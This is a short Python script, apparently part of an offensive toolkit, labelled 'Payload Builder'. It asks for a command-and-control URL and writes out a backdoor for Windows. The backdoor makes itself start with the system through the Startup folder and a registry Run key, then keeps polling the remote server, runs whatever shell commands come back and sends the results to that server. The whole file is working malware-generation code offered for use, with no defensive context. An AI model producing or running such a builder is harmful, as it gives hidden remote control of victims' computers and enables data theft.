import sys, os, random, string
_root = os.path.dirname(os.path.abspath(__file__)).rsplit("Tools",1)[0]
if _root not in sys.path:
    sys.path.insert(0,_root)
from Core.Engine import *

set_title("Payload Builder")
print(LOGO)
name = input(f"{PM} Output name -> {RS}").strip()
c2 = input(f"{PM} C2 URL -> {RS}").strip()
bid = "".join(random.choices(string.ascii_lowercase+string.digits, k=16))
payload = 'import os,sys,subprocess,time,requests,shutil\nC2="' + c2 + '"\nBID="' + bid + '"\ndef p():\n    try:\n        import winreg\n        pth=os.path.join(os.getenv("APPDATA"),r"Microsoft\\Windows\\Start Menu\\Programs\\Startup","' + name + '.exe")\n        shutil.copy2(sys.executable,pth)\n        k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE)\n        winreg.SetValueEx(k,"' + name + '",0,winreg.REG_SZ,pth)\n        winreg.CloseKey(k)\n    except:pass\ndef b():\n    p()\n    while True:\n        try:\n            r=requests.get(C2+"?id="+BID,timeout=10)\n            if r.text.strip():\n                o=subprocess.run(r.text.strip(),shell=True,capture_output=True,text=True).stdout\n                requests.post(C2+"?id="+BID,data=o,timeout=10)\n        except:pass\n        time.sleep(3)\nimport threading\nthreading.Thread(target=b,daemon=True).start()\nwhile True:time.sleep(60)\n'
out = os.path.join(ROOT, "1-Output")
os.makedirs(out, exist_ok=True)
fp = os.path.join(out, f"{name}.py")
with open(fp, "w") as f:
    f.write(payload)
print(f"\n{OK} {fp}")
pause()
restart()
